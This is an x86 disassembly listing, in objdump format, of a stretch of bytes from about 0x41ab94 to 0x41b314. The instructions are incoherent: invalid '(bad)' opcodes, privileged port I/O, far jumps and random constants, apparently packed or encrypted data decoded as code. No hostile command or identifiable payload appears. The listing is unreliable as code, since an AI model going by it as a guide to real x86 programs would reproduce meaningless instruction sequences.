  41ab94:	repnz loopne 0x41ab69
  41ab97:	sub    BYTE PTR [edi-0x51fed636],bl
  41ab9d:	pushf  
  41ab9e:	add    edx,ecx
  41aba0:	cdq    
  41aba1:	mov    ecx,0xe53ef7df
  41aba6:	push   ds
  41aba7:	shr    BYTE PTR [ebx],cl
  41aba9:	fsub   QWORD PTR [ebp-0x903612d]
  41abaf:	mov    al,ds:0xa74993b9
  41abb4:	mov    ch,0x2f
  41abb6:	mov    al,ds:0x6d8e71b1
  41abbb:	imul   ebx,DWORD PTR [esi+0x49a3569e],0xffffffb5
  41abc2:	std    
  41abc3:	bound  ecx,QWORD PTR [eax+0x6cae2b17]
  41abc9:	inc    esp
  41abca:	and    eax,0xf89d10a3
  41abcf:	test   eax,0x4c3602e3
  41abd4:	mov    dl,BYTE PTR [edx-0x57]
  41abd7:	stc    
  41abd8:	cmp    al,0x84
  41abda:	adc    bh,BYTE PTR [edx]
  41abdc:	(bad)  
  41abdd:	jo     0x41ac47
  41abdf:	loope  0x41abf0
  41abe1:	sub    DWORD PTR [edx],esp
  41abe3:	add    DWORD PTR [esi-0x5b],ebx
  41abe6:	xchg   edi,eax
  41abe7:	(bad)  
  41abe8:	sbb    DWORD PTR [ecx+0x4e],edx
  41abeb:	into   
  41abec:	inc    esi
  41abed:	imul   BYTE PTR [ebp+0x73215c85]
  41abf3:	or     esp,DWORD PTR [edx-0x264bab09]
  41abf9:	sbb    eax,0xb2c6ded5
  41abfe:	mov    dl,0xee
  41ac00:	sahf   
  41ac01:	cli    
  41ac02:	inc    edx
  41ac03:	fimul  DWORD PTR [ebx+0x18]
  41ac06:	pop    ebx
  41ac07:	in     al,dx
  41ac08:	dec    esi
  41ac09:	fs dec ebx
  41ac0b:	add    eax,DWORD PTR [esi-0x23]
  41ac0e:	icebp  
  41ac0f:	mov    cs,edx
  41ac11:	or     al,0xca
  41ac13:	adc    BYTE PTR [ebp+0x72280aca],bh
  41ac19:	and    esp,ecx
  41ac1b:	mov    esp,DWORD PTR [ecx-0x27]
  41ac1e:	lods   eax,DWORD PTR ds:[esi]
  41ac1f:	mov    dx,0x5204
  41ac23:	or     DWORD PTR [edx],ecx
  41ac25:	cmp    eax,0x74fc3766
  41ac2a:	add    eax,0x82d57735
  41ac2f:	sub    DWORD PTR [edi],ecx
  41ac31:	sbb    dl,ah
  41ac33:	test   eax,0xefba4c87
  41ac38:	imul   esi,DWORD PTR [esi-0x62],0x45
  41ac3c:	popa   
  41ac3d:	sahf   
  41ac3e:	or     DWORD PTR [ebx-0x2a],0x78c9da3f
  41ac45:	mov    bl,0xd8
  41ac47:	hlt    
  41ac48:	jns    0x41ac92
  41ac4a:	loope  0x41ac28
  41ac4c:	mov    ds:0x6cb0d9ee,al
  41ac51:	pop    esp
  41ac52:	out    dx,eax
  41ac53:	bound  ebx,QWORD PTR [edx-0x2a78783c]
  41ac59:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac5a:	pusha  
  41ac5b:	push   ds
  41ac5c:	rol    DWORD PTR [ebp+0xe7dd803],cl
  41ac62:	mov    ss,WORD PTR [eax]
  41ac64:	mov    WORD PTR [ebx],?
  41ac66:	inc    ebx
  41ac67:	ja     0x41ac5a
  41ac69:	push   ebx
  41ac6a:	and    ebx,edi
  41ac6c:	test   al,0x15
  41ac6e:	fwait
  41ac6f:	push   eax
  41ac70:	pop    ecx
  41ac71:	push   esp
  41ac72:	(bad)  
  41ac73:	call   0xbe66f511
  41ac78:	push   eax
  41ac79:	xor    eax,0x1bf39419
  41ac7e:	pop    eax
  41ac7f:	xchg   esp,eax
  41ac80:	hlt    
  41ac81:	dec    ebp
  41ac82:	aam    0x7
  41ac84:	dec    esi
  41ac85:	popf   
  41ac86:	push   ebp
  41ac87:	and    al,0x4f
  41ac89:	jns    0x41acfd
  41ac8b:	subps  xmm5,XMMWORD PTR [ecx+0x23]
  41ac8f:	sbb    DWORD PTR [eax+0x77],0xb40320a7
  41ac96:	in     eax,0x9c
  41ac98:	or     al,0xb4
  41ac9a:	loop   0x41acbf
  41ac9c:	dec    ecx
  41ac9d:	shr    DWORD PTR [edx+edi*4+0x2de1ead0],0x7d
  41aca5:	and    BYTE PTR [edx+0x34d03bbd],0x11
  41acac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41acad:	xor    BYTE PTR [edx-0x5fd40a71],cl
  41acb3:	imul   ebp,DWORD PTR [esi+eiz*2-0x72],0x9e63ece3
  41acbb:	push   0x54
  41acbd:	jnp    0x41ac6b
  41acbf:	popf   
  41acc0:	rcr    bh,cl
  41acc2:	and    eax,0xd50a7d10
  41acc7:	mov    ds:0x239dbd0f,eax
  41accc:	add    DWORD PTR [edi+eax*2+0x25907041],0xffffffb3
  41acd4:	js     0x41ad44
  41acd6:	jg     0x41ad51
  41acd8:	ret    
  41acd9:	xor    BYTE PTR [ecx+0x34],bl
  41acdc:	loope  0x41ace5
  41acde:	imul   edx,DWORD PTR [ebx],0xa79a8857
  41ace4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ace5:	int    0x96
  41ace7:	test   DWORD PTR [eax-0x23c83162],ecx
  41aced:	xor    al,ah
  41acef:	jecxz  0x41acd9
  41acf1:	add    ebx,ebp
  41acf3:	fst    DWORD PTR [ebx-0x42909603]
  41acf9:	mov    dl,0xa9
  41acfb:	sbb    DWORD PTR [ecx+0x1f],edi
  41acfe:	push   es
  41acff:	mov    dh,0xec
  41ad01:	lock bound ebx,QWORD PTR [ebx-0x19268b63]
  41ad08:	sbb    DWORD PTR [edi-0x24305bf1],edi
  41ad0e:	mov    al,ds:0x63e0d4
  41ad13:	xor    dl,dl
  41ad15:	sbb    dl,BYTE PTR [ecx+esi*8+0x74]
  41ad19:	xchg   esi,eax
  41ad1a:	icebp  
  41ad1b:	fs out 0x84,al
  41ad1e:	pop    eax
  41ad1f:	js     0x41ace2
  41ad21:	in     al,dx
  41ad22:	popf   
  41ad23:	push   ds
  41ad24:	push   es
  41ad25:	push   ds
  41ad26:	mov    eax,ds:0x2e5b5897
  41ad2b:	push   esi
  41ad2c:	stc    
  41ad2d:	nop
  41ad2e:	scas   eax,DWORD PTR es:[edi]
  41ad2f:	dec    esi
  41ad30:	icebp  
  41ad31:	and    DWORD PTR [ebp+0xcaf6d9e],0x34e97d51
  41ad3b:	and    ebp,esi
  41ad3d:	xor    al,0x9b
  41ad3f:	mov    esp,DWORD PTR [eax]
  41ad41:	xor    BYTE PTR [ecx+esi*8],dh
  41ad44:	sub    al,0xe2
  41ad46:	cmp    ch,BYTE PTR [ebx+0x55]
  41ad49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ad4a:	shr    dl,0x4c
  41ad4d:	cmc    
  41ad4e:	xchg   ebx,eax
  41ad4f:	jbe    0x41adc5
  41ad51:	pop    ds
  41ad52:	inc    ecx
  41ad53:	std    
  41ad54:	jno    0x41ad74
  41ad56:	mov    dl,BYTE PTR [ecx-0x1dacbc73]
  41ad5c:	mov    DWORD PTR [ecx],ebp
  41ad5e:	mov    WORD PTR [edx+0x436165c0],?
  41ad64:	xor    eax,0x5008fa2c
  41ad69:	adc    ecx,DWORD PTR [ebx]
  41ad6b:	mov    dh,0x36
  41ad6d:	outs   dx,DWORD PTR ds:[esi]
  41ad6e:	push   ds
  41ad6f:	not    DWORD PTR [ebp-0x64d2e1a]
  41ad75:	inc    BYTE PTR [esi-0x41]
  41ad78:	inc    esi
  41ad79:	scas   al,BYTE PTR es:[edi]
  41ad7a:	inc    ecx
  41ad7b:	ret    
  41ad7c:	das    
  41ad7d:	mov    esi,0xb15f60c9
  41ad82:	sub    DWORD PTR [esi-0x4aadda8],ebp
  41ad88:	in     eax,dx
  41ad89:	rcl    DWORD PTR [edi-0x42874b79],cl
  41ad8f:	inc    ecx
  41ad90:	mov    edi,0x7ee56ce1
  41ad95:	leave  
  41ad96:	lahf   
  41ad97:	or     dl,BYTE PTR [edx+ecx*8]
  41ad9a:	mov    DWORD PTR [ecx-0xd64799c],esp
  41ada0:	xchg   ebp,eax
  41ada1:	xor    bh,al
  41ada3:	adc    eax,0x150ee1cb
  41ada8:	pop    esp
  41ada9:	xor    edi,DWORD PTR [edx-0x64]
  41adac:	mul    BYTE PTR [edx-0xc]
  41adaf:	jnp    0x41ad9b
  41adb1:	enter  0x7758,0xbc
  41adb5:	inc    esp
  41adb6:	jp     0x41ad7f
  41adb8:	push   eax
  41adb9:	mov    ecx,0x58236e68
  41adbe:	dec    eax
  41adbf:	jno    0x41adc7
  41adc1:	aaa    
  41adc2:	add    ecx,esp
  41adc4:	sub    ebp,DWORD PTR [edi+0x63]
  41adc7:	push   es
  41adc8:	jle    0x41add3
  41adca:	mov    eax,0xb101ea85
  41adcf:	cmp    eax,0xa4072a27
  41add4:	dec    ebx
  41add5:	out    0x1a,eax
  41add7:	popf   
  41add8:	pop    es
  41add9:	inc    edi
  41adda:	mov    ecx,0x7980bfe4
  41addf:	jbe    0x41ada4
  41ade1:	inc    eax
  41ade2:	rcr    BYTE PTR [ebp+0x1f],0x8c
  41ade6:	out    0x72,al
  41ade8:	call   0x5491:0xcecc85d
  41adef:	jo     0x41ae54
  41adf1:	(bad)  
  41adf2:	cmp    al,BYTE PTR [esi-0x28926b96]
  41adf8:	mov    edx,edi
  41adfa:	mov    eax,0x65df7049
  41adff:	iret   
  41ae00:	push   cs
  41ae01:	push   0xf
  41ae03:	lods   al,BYTE PTR ds:[esi]
  41ae04:	mov    edi,DWORD PTR [edi]
  41ae06:	rcr    BYTE PTR ss:[ebx-0x56],0xeb
  41ae0b:	mov    ecx,DWORD PTR [eax+0xed0553e]
  41ae11:	gs pop esi
  41ae13:	retf   
  41ae14:	sub    ch,BYTE PTR [edx+0x15d4239a]
  41ae1a:	add    eax,0xc80cec9f
  41ae1f:	jmp    0xad46:0x4204e7cf
  41ae26:	scas   al,BYTE PTR es:[edi]
  41ae27:	mov    ds:0xdd98e184,al
  41ae2c:	fwait
  41ae2d:	inc    esp
  41ae2e:	xchg   ebx,eax
  41ae2f:	mov    dh,0x90
  41ae31:	hlt    
  41ae32:	pop    ds
  41ae33:	stos   DWORD PTR es:[edi],eax
  41ae34:	cmp    DWORD PTR [ebx],eax
  41ae36:	stc    
  41ae37:	push   ds
  41ae38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae39:	pop    eax
  41ae3a:	sbb    eax,0x718e63a7
  41ae3f:	sahf   
  41ae40:	or     ebx,esp
  41ae42:	push   eax
  41ae43:	cli    
  41ae44:	add    ah,BYTE PTR ds:0x6a6f8834
  41ae4a:	sbb    DWORD PTR [di+0x32],0x49fdad78
  41ae52:	mov    eax,ds:0xea7b0736
  41ae57:	add    eax,0x66dc0a88
  41ae5c:	pop    edi
  41ae5d:	xchg   esp,eax
  41ae5e:	hlt    
  41ae5f:	pop    eax
  41ae60:	jo     0x41ae53
  41ae62:	inc    ecx
  41ae63:	xor    cl,BYTE PTR [ecx-0x8]
  41ae66:	(bad)  
  41ae68:	and    dl,bh
  41ae6a:	push   ss
  41ae6b:	lods   al,BYTE PTR ds:[esi]
  41ae6c:	aam    0xa4
  41ae6e:	mov    ebp,DWORD PTR [edi]
  41ae70:	push   0xa9dcba1
  41ae75:	out    0xcb,al
  41ae77:	cmc    
  41ae78:	xchg   edx,eax
  41ae79:	je     0x41aebe
  41ae7b:	dec    ecx
  41ae7c:	out    0x38,al
  41ae7e:	hlt    
  41ae7f:	fidiv  WORD PTR [ebx]
  41ae81:	and    cl,BYTE PTR [ebp+esi*2-0xc]
  41ae85:	xchg   edi,eax
  41ae86:	scas   al,BYTE PTR es:[edi]
  41ae87:	adc    esp,DWORD PTR ds:0x973f26f5
  41ae8d:	mov    eax,DWORD PTR [edx]
  41ae8f:	jg     0x41aee5
  41ae91:	nop
  41ae92:	bound  ecx,QWORD PTR [ebp+ebx*4+0x67]
  41ae96:	smsw   ebx
  41ae99:	mov    ch,0x1e
  41ae9b:	sbb    eax,0x6451bbd7
  41aea0:	cli    
  41aea1:	ret    
  41aea2:	sbb    BYTE PTR [ecx+0x60],bl
  41aea5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aea6:	stos   BYTE PTR es:[edi],al
  41aea7:	hlt    
  41aea8:	adc    DWORD PTR [esi],esp
  41aeaa:	imul   eax,DWORD PTR [edi+0x21],0x12
  41aeae:	call   0x3d6fc9f7
  41aeb3:	dec    edx
  41aeb4:	(bad)  
  41aeb5:	cmp    al,0x4b
  41aeb7:	sub    BYTE PTR [edx+0x76],cl
  41aeba:	cmp    DWORD PTR [ecx],0xffffff80
  41aebd:	mov    eax,0x3515eaa
  41aec2:	jns    0x41ae64
  41aec4:	sti    
  41aec5:	(bad)  
  41aec6:	inc    DWORD PTR [ebx-0xad2c1b1]
  41aecc:	jae    0x41ae61
  41aece:	popa   
  41aecf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aed0:	jge    0x41aea9
  41aed2:	and    DWORD PTR [ebp-0x19],ecx
  41aed5:	mov    ?,WORD PTR [ebx]
  41aed7:	push   cs
  41aed8:	jne    0x41ae60
  41aeda:	jle    0x41ae9e
  41aedc:	aas    
  41aedd:	xchg   ecx,eax
  41aede:	je     0x41af1e
  41aee0:	cdq    
  41aee1:	ins    DWORD PTR es:[edi],dx
  41aee2:	aaa    
  41aee3:	mov    edx,0xad0db1e7
  41aee8:	out    0xc4,al
  41aeea:	jg     0x41aee4
  41aeec:	aas    
  41aeed:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41aeee:	popf   
  41aeef:	loope  0x41ae93
  41aef1:	adc    BYTE PTR [edx+0x5bb9403c],al
  41aef7:	sar    DWORD PTR [ebp+0x46],1
  41aefa:	imul   DWORD PTR [ebp+0x1635531]
  41af00:	pop    edx
  41af01:	retf   
  41af02:	or     edx,esi
  41af04:	jl     0x41af7a
  41af06:	ret    
  41af07:	into   
  41af08:	es rdtsc 
  41af0b:	add    DWORD PTR [ecx-0x556594b5],0xb4ecb8dc
  41af15:	xchg   edx,eax
  41af16:	push   ds
  41af17:	dec    ecx
  41af18:	(bad)  
  41af19:	in     al,dx
  41af1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af1b:	clc    
  41af1c:	jns    0x41af0b
  41af1e:	add    al,0x79
  41af20:	xor    al,0xed
  41af22:	xor    DWORD PTR cs:[ebp+0x75278afd],esp
  41af29:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41af2a:	push   cs
  41af2b:	push   eax
  41af2c:	sti    
  41af2d:	jno    0x41af98
  41af2f:	aad    0x8
  41af31:	out    dx,al
  41af32:	icebp  
  41af33:	xchg   ebx,eax
  41af34:	add    eax,0x38c62e37
  41af39:	push   esp
  41af3a:	sub    BYTE PTR [ecx+0x5dc8381b],dh
  41af40:	jecxz  0x41aed3
  41af42:	rol    BYTE PTR [ebx+edi*1+0x2a],1
  41af46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41af47:	lods   al,BYTE PTR ds:[esi]
  41af48:	push   eax
  41af49:	pop    edx
  41af4a:	aad    0xb
  41af4c:	jp     0x41afb3
  41af4e:	xlat   BYTE PTR ds:[ebx]
  41af4f:	(bad)  [ebx]
  41af51:	or     ch,BYTE PTR [ecx]
  41af53:	out    dx,al
  41af54:	ds mov edx,0x231f3c7e
  41af5a:	in     al,0x64
  41af5c:	xor    edi,eax
  41af5e:	popa   
  41af5f:	fistp  WORD PTR [edx+0x2f8b8f0]
  41af65:	pop    esp
  41af66:	and    ebx,ecx
  41af68:	pop    ebx
  41af69:	pop    ds
  41af6a:	inc    ebp
  41af6b:	out    0xcb,al
  41af6d:	mov    esi,edi
  41af6f:	pop    edi
  41af70:	jo     0x41af15
  41af72:	xchg   esi,eax
  41af73:	adc    ebp,DWORD PTR [edx-0x62]
  41af76:	cmps   BYTE PTR fs:[esi],BYTE PTR es:[edi]
  41af78:	inc    eax
  41af79:	les    esi,FWORD PTR [esi+0x6]
  41af7c:	mov    DWORD PTR [eax-0x4e7456a],edx
  41af82:	mov    al,0x76
  41af84:	scas   al,BYTE PTR es:[edi]
  41af85:	pop    edx
  41af86:	push   es
  41af87:	xlat   BYTE PTR ds:[ebx]
  41af88:	xchg   edi,eax
  41af89:	sub    eax,0x6cc28532
  41af8e:	fiadd  WORD PTR [ebp-0x18]
  41af91:	mov    edi,0xf4d0ea32
  41af96:	int3   
  41af97:	arpl   WORD PTR [esi+0x260ed944],dx
  41af9d:	in     eax,0xf1
  41af9f:	xor    eax,0x973caaac
  41afa4:	popf   
  41afa5:	jmp    0xd519589
  41afaa:	test   dh,0x71
  41afad:	das    
  41afae:	out    0x69,al
  41afb0:	lock cmp DWORD PTR [edi],ebp
  41afb3:	sub    DWORD PTR [ecx-0x15d7dceb],edi
  41afb9:	aas    
  41afba:	call   0x1e67a4e6
  41afbf:	test   BYTE PTR [ebp-0x42c72219],dl
  41afc5:	rol    BYTE PTR [edi],0xb4
  41afc8:	shl    BYTE PTR [ebp-0x4d],cl
  41afcb:	mov    eax,ds:0x45d64e72
  41afd0:	ss mov esi,0xfcde9da9
  41afd6:	mov    eax,ss:0xf4b608b2
  41afdc:	in     al,0x70
  41afde:	mov    esi,0xbd1209de
  41afe3:	shl    DWORD PTR [edi-0x1d],cl
  41afe6:	shl    DWORD PTR [ecx-0x4],cl
  41afe9:	call   0x7b3e:0x8c17653b
  41aff0:	jnp    0x41afcd
  41aff2:	mov    ch,0x41
  41aff4:	mov    dl,0xbc
  41aff6:	xor    eax,0xc2819e37
  41affb:	popa   
  41affc:	bound  ecx,QWORD PTR [edi+0xd24a72c]
  41b002:	clc    
  41b003:	es dec edx
  41b005:	inc    ecx
  41b006:	mov    al,ds:0x72e48bb9
  41b00b:	(bad)  
  41b00c:	dec    esp
  41b00d:	jae    0x41b00d
  41b00f:	or     al,0xe4
  41b011:	mul    BYTE PTR [edx]
  41b013:	or     BYTE PTR [edx+0x7e],dl
  41b016:	xchg   DWORD PTR [esi+ebx*4],eax
  41b019:	stos   BYTE PTR es:[edi],al
  41b01a:	adc    eax,0xc7a81d0a
  41b01f:	mov    edi,0x46e18726
  41b024:	(bad)  
  41b025:	and    ebp,DWORD PTR [esi-0x5f41739c]
  41b02b:	fst    QWORD PTR [ecx]
  41b02d:	outs   dx,DWORD PTR ds:[esi]
  41b02e:	rcr    BYTE PTR es:[ebx+0x79],1
  41b032:	dec    BYTE PTR [edi]
  41b034:	jbe    0x41aff1
  41b036:	not    dl
  41b038:	mov    edx,0xe25c56ed
  41b03d:	push   0xbe085927
  41b042:	mov    cl,0x65
  41b044:	ret    
  41b045:	popf   
  41b046:	test   DWORD PTR [esi-0x33],0xcd549d9d
  41b04d:	es inc esp
  41b04f:	lock and al,0x77
  41b052:	cmp    BYTE PTR [edx+0x2dde4a0e],cl
  41b058:	fcmovu st,st(7)
  41b05a:	arpl   sp,dx
  41b05c:	mov    eax,0x797766a5
  41b061:	xchg   esp,eax
  41b062:	mov    edi,ecx
  41b064:	mov    ebx,0xa9c7a840
  41b069:	adc    DWORD PTR [eax-0x62d045f3],esi
  41b06f:	(bad)  
  41b070:	sahf   
  41b071:	mov    ebp,ss
  41b073:	pop    ebx
  41b074:	stc    
  41b075:	loop   0x41b0a3
  41b077:	sub    BYTE PTR [ebp+0x47],0x50
  41b07b:	int3   
  41b07c:	(bad)  
  41b07d:	stos   DWORD PTR es:[edi],eax
  41b07e:	(bad)  
  41b07f:	jnp    0x41b04a
  41b081:	shr    BYTE PTR ds:0xfc98d045,1
  41b087:	cmp    bl,BYTE PTR [ecx]
  41b089:	std    
  41b08a:	aaa    
  41b08b:	dec    esi
  41b08c:	in     eax,0x4c
  41b08e:	in     eax,dx
  41b08f:	and    edx,DWORD PTR [esi+0x493941e6]
  41b095:	jo     0x41b10d
  41b097:	stc    
  41b098:	add    ecx,ebx
  41b09a:	xor    BYTE PTR [ecx],bl
  41b09c:	adc    eax,0xc5c266e5
  41b0a1:	add    dh,BYTE PTR [edx+0x1680cc5c]
  41b0a7:	loop   0x41b077
  41b0a9:	std    
  41b0aa:	das    
  41b0ab:	mov    BYTE PTR [edx-0x76],ch
  41b0ae:	je     0x41b0ef
  41b0b0:	jmp    0x1a96:0x5af12c9b
  41b0b7:	shl    bh,0xc
  41b0ba:	adc    eax,0xeb4b744d
  41b0bf:	shl    BYTE PTR [ebx-0x512e23bd],1
  41b0c5:	inc    eax
  41b0c6:	sub    ebp,DWORD PTR [ebx+0x7a894c3a]
  41b0cc:	jnp    0x41b097
  41b0ce:	and    eax,0x582fb1d
  41b0d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b0d4:	scas   eax,DWORD PTR es:[edi]
  41b0d5:	push   ecx
  41b0d6:	add    DWORD PTR [edi+0x3e9ed57],eax
  41b0dc:	lods   al,BYTE PTR ds:[esi]
  41b0dd:	jb     0x41b146
  41b0df:	xor    BYTE PTR [esp+ebp*8],0xc7
  41b0e3:	inc    ebx
  41b0e4:	js     0x41b0e1
  41b0e6:	mov    esp,0xe1e437d6
  41b0eb:	cli    
  41b0ec:	test   BYTE PTR [edi-0x65ca9ac4],ch
  41b0f2:	paddw  mm0,QWORD PTR cs:[ebp+0x6a14c10a]
  41b0fa:	push   edx
  41b0fb:	push   ds
  41b0fc:	mov    eax,db6
  41b0ff:	inc    esp
  41b100:	jmp    0x75f1:0x871995cb
  41b107:	into   
  41b108:	ins    BYTE PTR es:[edi],dx
  41b109:	add    al,ch
  41b10b:	or     dh,BYTE PTR [esp+edi*4+0x2d9002e3]
  41b112:	imul   ebp,DWORD PTR [eax+0x23],0x52
  41b116:	fcom   DWORD PTR [edx+ebp*2-0x662e3359]
  41b11d:	xor    al,0x97
  41b11f:	ror    DWORD PTR [eax-0x388929c8],cl
  41b125:	pushf  
  41b126:	sbb    DWORD PTR [edx+0x6f],edx
  41b129:	mov    eax,0xe9a4e87b
  41b12e:	xchg   ebx,eax
  41b12f:	xchg   esp,eax
  41b130:	ss dec ecx
  41b132:	ret    
  41b133:	stc    
  41b134:	cmp    DWORD PTR [esi-0x57934491],edi
  41b13a:	inc    ebp
  41b13b:	fmul   st,st(7)
  41b13d:	jmp    0xbee:0x39b59b0c
  41b144:	ja     0x41b0df
  41b146:	and    DWORD PTR [ebp-0x78],ecx
  41b149:	mov    cl,ch
  41b14b:	jmp    0x767f:0x8d58c5d3
  41b152:	pop    ecx
  41b153:	mov    DWORD PTR [ebx*1+0x6708b821],edx
  41b15a:	and    BYTE PTR [eax-0x1634e208],0x77
  41b161:	sahf   
  41b162:	stos   DWORD PTR es:[edi],eax
  41b163:	pop    es
  41b164:	imul   eax,eax,0x44c9e0f7
  41b16a:	je     0x41b177
  41b16c:	or     eax,0x7c4e290f
  41b171:	test   BYTE PTR [edx+eax*8],0xc7
  41b175:	stc    
  41b176:	imul   edx,DWORD PTR [esi+0x2074384f],0x15a4329a
  41b180:	popa   
  41b181:	inc    ecx
  41b182:	pusha  
  41b183:	fldcw  WORD PTR [esi]
  41b185:	in     eax,0x69
  41b187:	ja     0x41b1a7
  41b189:	in     eax,0x2b
  41b18b:	hlt    
  41b18c:	mov    esp,0x85749edf
  41b191:	cmp    edi,ebp
  41b193:	js     0x41b152
  41b195:	fdivp  st(5),st
  41b197:	(bad)  [ecx+0x6d]
  41b19a:	dec    edx
  41b19b:	lahf   
  41b19c:	(bad)  
  41b19d:	jbe    0x41b209
  41b19f:	cdq    
  41b1a0:	ds dec edi
  41b1a2:	pop    edx
  41b1a3:	pushf  
  41b1a4:	mov    ds:0x3efb3244,eax
  41b1a9:	sub    esp,DWORD PTR [edx-0x3d]
  41b1ac:	gs inc ebx
  41b1ae:	jmp    0x9153a906
  41b1b3:	xchg   DWORD PTR [ebp+0x8],esp
  41b1b6:	xor    BYTE PTR [esp+esi*8],0x71
  41b1ba:	ror    esi,1
  41b1bc:	xor    DWORD PTR [ebx],edi
  41b1be:	xlat   BYTE PTR ds:[ebx]
  41b1bf:	adc    edi,esi
  41b1c1:	cmp    ecx,edi
  41b1c3:	xchg   esp,eax
  41b1c4:	neg    DWORD PTR [ebx+0x59]
  41b1c7:	in     al,0x2e
  41b1c9:	fmul   st,st(4)
  41b1cb:	int    0x9d
  41b1cd:	mov    ebx,0xc37c1d90
  41b1d2:	and    eax,0x88432790
  41b1d7:	cdq    
  41b1d8:	hlt    
  41b1d9:	cmp    al,BYTE PTR [esi]
  41b1db:	scas   eax,DWORD PTR es:[edi]
  41b1dc:	outs   dx,BYTE PTR ds:[esi]
  41b1dd:	xchg   BYTE PTR [eax+0x6e],dh
  41b1e0:	outs   dx,BYTE PTR ds:[esi]
  41b1e1:	nop
  41b1e2:	clc    
  41b1e3:	js     0x41b179
  41b1e5:	les    edx,FWORD PTR [edx]
  41b1e7:	loop   0x41b1bb
  41b1e9:	or     DWORD PTR [esi],ecx
  41b1eb:	and    DWORD PTR [esi-0x647e679f],esp
  41b1f1:	ret    
  41b1f2:	and    DWORD PTR [ebp+edi*1+0x35],ebp
  41b1f6:	mov    eax,0x1bd24853
  41b1fb:	loopne 0x41b19a
  41b1fd:	addr16 icebp 
  41b1ff:	mov    al,0xd
  41b201:	jmp    0x41b225
  41b203:	xor    DWORD PTR [ebx-0x8],esp
  41b206:	mov    DWORD PTR [ecx+0x73],edi
  41b209:	jge    0x41b196
  41b20b:	jae    0x41b203
  41b20d:	ins    BYTE PTR es:[edi],dx
  41b20e:	sub    eax,0x6e5ca5f5
  41b213:	fwait
  41b214:	sahf   
  41b215:	sbb    BYTE PTR [ebx+0x16],bl
  41b218:	jecxz  0x41b293
  41b21a:	test   al,0x9e
  41b21c:	push   eax
  41b21d:	repnz dec edi
  41b21f:	sti    
  41b220:	pop    ecx
  41b221:	aas    
  41b222:	or     DWORD PTR [esi],ebp
  41b224:	xchg   esi,eax
  41b225:	retf   
  41b226:	in     eax,dx
  41b227:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b228:	sub    esi,esi
  41b22a:	mov    ds:0x62f9a5eb,al
  41b22f:	inc    edx
  41b230:	mov    dh,0x14
  41b232:	mov    eax,0xbe607e15
  41b237:	and    al,ch
  41b239:	popf   
  41b23a:	adc    BYTE PTR [edi],bh
  41b23c:	ins    DWORD PTR es:[edi],dx
  41b23d:	ror    ecx,0x39
  41b240:	out    dx,al
  41b241:	xor    cl,BYTE PTR ss:[esi-0x5abe57a4]
  41b248:	jne    0x41b1d4
  41b24a:	lahf   
  41b24b:	or     DWORD PTR [ebx+0x61763b78],edx
  41b251:	aam    0x12
  41b253:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b254:	mov    bh,0xb1
  41b256:	enter  0xdb44,0x19
  41b25a:	loopne 0x41b1f4
  41b25c:	mov    ch,0x6b
  41b25e:	mov    dl,0x19
  41b260:	inc    edi
  41b261:	test   al,cl
  41b263:	cli    
  41b264:	imul   edi,DWORD PTR [ebx+0x4ed11b6e],0x421566d0
  41b26e:	push   ebp
  41b26f:	repz jg 0x41b201
  41b272:	fisttp WORD PTR [ecx-0x33]
  41b275:	adc    dh,dl
  41b277:	xchg   ebx,eax
  41b278:	sahf   
  41b279:	imul   ebx,DWORD PTR ds:0x3083e7d8,0x4d8f249b
  41b283:	add    eax,0x4b4cd9cc
  41b288:	inc    ebp
  41b289:	ss xor al,0xa0
  41b28c:	ins    DWORD PTR es:[edi],dx
  41b28d:	(bad)  
  41b28f:	fsub   QWORD PTR [ebx+0x79]
  41b292:	dec    ebp
  41b293:	push   esi
  41b294:	pop    esi
  41b295:	push   edx
  41b296:	imul   edx,DWORD PTR [eax+0x5531aa5b],0x2e
  41b29d:	ret    
  41b29e:	mov    ds:0x1d13fddd,eax
  41b2a3:	iret   
  41b2a4:	inc    edx
  41b2a5:	xlat   BYTE PTR ds:[ebx]
  41b2a6:	add    al,0x1e
  41b2a8:	arpl   di,si
  41b2aa:	outs   dx,BYTE PTR ds:[esi]
  41b2ab:	inc    esi
  41b2ac:	sbb    ecx,DWORD PTR [eax-0x49]
  41b2af:	jno    0x41b271
  41b2b1:	jl     0x41b2c6
  41b2b3:	les    eax,FWORD PTR [edx+0x6b]
  41b2b6:	add    al,0x13
  41b2b8:	mov    bl,BYTE PTR [ecx+0x1c0a8dab]
  41b2be:	(bad)  [esi-0x5dbc2cf4]
  41b2c4:	push   eax
  41b2c5:	push   esi
  41b2c6:	add    ebx,ebx
  41b2c8:	int    0xe8
  41b2ca:	imul   esi,ebp,0x434dea30
  41b2d0:	dec    eax
  41b2d1:	sub    ecx,DWORD PTR [edi+0x2b56c61]
  41b2d7:	mov    ebp,0x968a2cdf
  41b2dc:	xlat   BYTE PTR ds:[ebx]
  41b2dd:	cwde   
  41b2de:	(bad)  
  41b2df:	out    0xf,al
  41b2e1:	mov    bl,0x68
  41b2e3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b2e4:	dec    DWORD PTR [esi+0x2e]
  41b2e7:	push   esi
  41b2e8:	je     0x41b280
  41b2ea:	and    al,0xa
  41b2ec:	or     DWORD PTR [ecx+0x16ae5f4],esi
  41b2f2:	jbe    0x41b2b4
  41b2f4:	cmp    BYTE PTR [ecx-0x2e],0x47
  41b2f8:	cwde   
  41b2f9:	out    0x53,eax
  41b2fb:	ror    BYTE PTR ds:0x75587e35,cl
  41b301:	xchg   esi,eax
  41b302:	fwait
  41b303:	ja     0x41b2d3
  41b305:	and    ah,BYTE PTR ds:0xf15473c2
  41b30b:	push   esp
  41b30c:	popa   
  41b30d:	pushf  
  41b30e:	xor    DWORD PTR [edx+0x32446bfc],ebp
  41b314:	jmp    0x41b30f
